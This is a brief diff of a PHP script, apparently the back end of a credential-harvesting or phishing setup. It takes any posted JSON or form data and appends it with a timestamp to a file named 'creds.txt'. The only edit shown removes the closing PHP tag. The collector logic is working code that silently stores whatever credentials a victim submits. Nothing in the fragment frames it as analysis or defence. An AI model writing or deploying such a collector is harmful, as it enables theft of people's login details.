@@ -3,5 +3,4 @@ $data = json_decode(file_get_contents('php://input'), true) ?? $_POST;
 $line = date('[Y-m-d H:i:s] ') . json_encode($data) . PHP_EOL;
 file_put_contents('creds.txt', $line, FILE_APPEND | LOCK_EX);
 http_response_code(200);
-?>
 
